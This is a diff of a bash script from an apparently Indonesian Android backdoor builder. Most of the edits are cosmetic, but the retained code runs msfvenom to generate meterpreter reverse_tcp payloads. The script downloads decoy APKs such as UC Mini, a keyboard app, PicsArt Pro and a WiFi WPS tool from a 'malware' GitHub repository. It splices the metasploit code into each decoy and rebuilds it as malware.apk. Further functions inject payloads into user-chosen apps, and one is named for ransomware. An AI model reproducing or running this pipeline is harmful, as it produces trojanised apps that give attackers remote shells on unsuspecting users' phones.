+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download wifi wps from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/wps.apk?raw=true > /dev/null 2>&1
         mv wps.apk?raw=true wps.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle wifi wps please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle wifi wps please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d wps.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle wifi wps please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle wifi wps please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr wps/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit wps/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild wifi wps please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild wifi wps please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b wps -o malware.apk
         rm -fr wps.apk wps payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor uc mini
+# fungsi Backdoor uc mini
 #
 function uc(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download uc mini from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download uc mini from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/uc.apk?raw=true > /dev/null 2>&1
         mv uc.apk?raw=true uc.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle uc mini please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle uc mini please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d uc.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle uc mini please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle uc mini please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr uc/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit uc/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild uc mini please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild uc mini please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b uc -o malware.apk
         rm -fr uc.apk uc payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor keyboard hacker
+# fungsi Backdoor keyboard hacker
 #
 function keyboard(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download keyboard hacker from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download keyboard hacker from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/keyboard.apk?raw=true > /dev/null 2>&1
         mv keyboard.apk?raw=true keyboard.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle keyboard hacker please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle keyboard hacker please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d keyboard.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle keyboard hacker please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle keyboard hacker please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr keyboard/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit keyboard/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild keyboard hacker please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild keyboard hacker please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b keyboard -o malware.apk
         rm -fr keyboard.apk keyboard payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor g45
+# fungsi Backdoor g45
 #
 function g45(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download g45 from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download g45 from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/g45.apk?raw=true > /dev/null 2>&1
         mv g45.apk?raw=true g45.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle g45 please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle g45 please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d g45.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle g45 please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle g45 please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr g45/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit g45/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild g45 please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild g45 please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b g45 -o malware.apk
         rm -fr g45.apk g45 payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor design
+# fungsi Backdoor design
 #
 function design(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download design from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download design from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/design.apk?raw=true > /dev/null 2>&1
         mv design.apk?raw=true design.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle design please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle design please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d design.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle design please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle design please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr design/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit design/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild design please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild design please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b design -o malware.apk
         rm -fr design.apk design payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor droidsqli
+# fungsi Backdoor droidsqli
 #
 function droidsql(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download droidsql from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download droidsql from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/droidsqli.apk?raw=true > /dev/null 2>&1
         mv droidsqli.apk?raw=true droidsqli.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle droidsql please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle droidsql please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d droidsqli.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle droidsql please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle droidsql please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr droidsqli/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit droidsqli/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild droidsql please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild droidsql please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b droidsqli -o malware.apk
         rm -fr droidsqli.apk droidsqli payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor ave player
+# fungsi Backdoor ave player
 #
 function ave(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download ave player from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download ave player from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/ave.apk?raw=true > /dev/null 2>&1
         mv ave.apk?raw=true ave.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle ave player please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle ave player please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d ave.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle ave player please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle ave player please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr ave/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit ave/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild design please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild ave player please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b ave -o malware.apk
         rm -fr ave.apk ave payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor indoxxi
+# fungsi Backdoor indoxxi
 #
 function indoxxi(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download indoxxi from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download indoxxi from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/indoxxi.apk?raw=true > /dev/null 2>&1
         mv indoxxi.apk?raw=true indoxxi.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle indoxxi please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle indoxxi please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d indoxxi.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle indoxxi please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle indoxxi please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr indoxxi/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit indoxxi/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild indoxxi please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild indoxxi please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b indoxxi -o malware.apk
         rm -fr ave.apk ave payload payload.apk
-        spiner
+
 }
 
-# fungsi backdoor piscart pro
+# fungsi Backdoor piscart pro
 #
 function picsart(){
         $fixjava
         sets
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Generate Backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download piscart pro from template\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download piscart pro from template\033[31;1m\n"
+
         echo
         cd $path/Malware
         wget https://github.com/K1M4K-ID/malware/blob/main/piscart.apk?raw=true > /dev/null 2>&1
         mv piscart.apk?raw=true piscart.apk > /dev/null
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Download\033[32;1m succesfully\033[31;1m\n"
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle payload please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d payload.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle piscart pro please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompyle piscart pro please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool d piscart.apk
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle piscart pro please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Recompyle piscart pro please wait\033[31;1m\n"
         cd $path/Malware
         rm -fr piscart/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit piscart/smali/com/metasploit
-        spiner
+
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild design please wait\033[31;1m\n"
-        spiner
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild piscart pro please wait\033[31;1m\n"
+
         echo
         cd $path/Malware
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         sudo apktool b piscart -o malware.apk
         rm -fr picsart.apk piscart payload payload.apk
-        spiner
+
 }
 
-# fungsi ubah nama backdoor
+# fungsi ubah nama Backdoor
 #
-function rename_backdoor(){
-read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan nama backdoor baru : "'\033[34;1m')" new
+function rename_Backdoor(){
+read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] nama backdoor : "'\033[34;1m')" new
 printf '\033[31;1m'
-spiner
 cd $path/Malware && mv malware.apk $new.apk
 echo
 sleep 0.025
-printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil dibuat menjadi ~>\033[31;1m $new\n"
+printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil diubah menjadi ~>\033[31;1m $new\n"
 printf '\033[31;1m'
-spiner
 echo
 sleep 3
 }
@@ -1753,7 +1597,7 @@ function clear_data(){
 # fix java sudo apktool, and sign
 #
 #_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
-# backdoor buat inject
+# Backdoor buat inject
 #
 function inject_payload(){
         sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
@@ -1768,10 +1612,10 @@ function xyz()
  orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
 }
 
-# decompyle payload
+# Decompyle payload
 #
 function decompile_payload(){
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile payload\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompile Payload\033[31;1m\n"
         spiner
         echo
         _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
@@ -1783,7 +1627,7 @@ function decompile_payload(){
 # decompile original
 #
 function decompile_original(){
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile original\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Decompile Original\033[31;1m\n"
         spiner
         echo
         sudo apktool d -f -o $path/original $orig
@@ -1791,13 +1635,13 @@ function decompile_original(){
         echo
 }
 
-# rebuild payload original
+# Rebuild payload original
 #
-function rebuild_original(){
+function Rebuild_original(){
 	printf '\033[31;1m'
         spiner
         echo
-        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild backdoor please wait\033[31;1m\n"
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] Rebuild Backdoor please wait\033[31;1m\n"
         spiner
         echo
         sudo apktool b $path/original -o ori.apk
@@ -1881,9 +1725,9 @@ function hook_smalies()
  fi
 }
 
-# fungsi android user input backdoor file
+# fungsi android user input Backdoor file
 #
-function backdoor_file(){
+function Backdoor_file(){
         sets_original
         inject_payload
         xyz
@@ -1892,7 +1736,7 @@ function backdoor_file(){
         perms
         hook_smalies
         sleep 1
-        rebuild_original
+        Rebuild_original
         sleep 1
         sign_orig
         sleep 1
@@ -1900,7 +1744,7 @@ function backdoor_file(){
         sleep 1
 }
 
-function backdoor_ransomware() {
+function Backdoor_ransomware() {
 	#statements
 	clear
 	baner
@@ -1917,7 +1761,7 @@ function backdoor_ransomware() {
 	perms
 	hook_smalies
 	sleep 1
-	rebuild_original
+	Rebuild_original
 	sleep 1
 	sign_orig
 	sleep 1
@@ -1927,11 +1771,11 @@ function backdoor_ransomware() {
 
 # listerner metasploit
